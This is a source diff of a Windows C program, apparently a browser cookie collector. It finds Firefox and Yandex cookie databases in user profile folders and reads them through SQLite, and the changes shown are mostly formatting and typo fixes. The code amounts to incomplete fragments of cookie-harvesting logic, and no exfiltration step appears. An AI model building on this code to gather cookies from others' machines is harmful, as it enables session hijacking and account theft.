@@ -33,7 +33,8 @@ uint32_t          offset = 0;
 cookies_datatype* local_container;
 
 
-int main(void)
+int
+main(void)
 {
     char  username[50];
     DWORD username_size = sizeof(username);
@@ -101,13 +102,14 @@ int main(void)
 
 
 /* This function will get full Firefox cookie db file,
-   bacause there are different directories with random names.
+   because there are different directories with random names.
 */
-char* get_ff_cookies_path(char* curr_path)
+char*
+get_ff_cookies_path(char* curr_path)
 {
-    char*   files[24];
-    char*   full_path;
-    uint8_t found;
+    char* files[24];
+    char* full_path;
+    bool  found;
 
     dir_reader(curr_path, files);
     full_path = (char *)malloc(sizeof(curr_path) * 2);
@@ -137,9 +139,10 @@ char* get_ff_cookies_path(char* curr_path)
 
 
 /* Will check an avaible browsers on this local machine.
-   Type browser_prediction defined in 'main.h'.
+   Type browser_prediction defined in 'main.h'. 
 */
-browser_prediction check_browsers(char* local, char* roaming)
+browser_prediction
+check_browsers(char* local, char* roaming)
 {
     browser_prediction status;
     status.FF = check_file_in_dir("Mozilla", roaming);
@@ -153,7 +156,8 @@ browser_prediction check_browsers(char* local, char* roaming)
 
 /* Collect SQL data from databases of browser's cookies.
 */
-void collect_data(browser_prediction status)
+void
+collect_data(browser_prediction status)
 {
     char* full_path = (char *)malloc(sizeof(status.user_path) + sizeof(YA_PATH) + 1);
     char* ff_path   = (char *)malloc((sizeof(status.user_path) + sizeof(FF_PATH)) * 3);
@@ -192,7 +196,8 @@ void collect_data(browser_prediction status)
 
 /* Callback function for SQL request to the database.
 */
-static int callback(void* bt, int argc, char** argv, char **colname)
+static int 
+callback(void* bt, int argc, char** argv, char **colname)
 {
     for (int i = 0; i < argc; i++)
     {
@@ -213,7 +218,8 @@ static int callback(void* bt, int argc, char** argv, char **colname)
 
 /* Will get data from SQL database and 'll put it in container.
 */
-void get_sql(const char* sql_path, uint8_t bt)
+void
+get_sql(const char* sql_path, uint8_t bt)
 {
     sqlite3* database;
     char*    err        = 0;
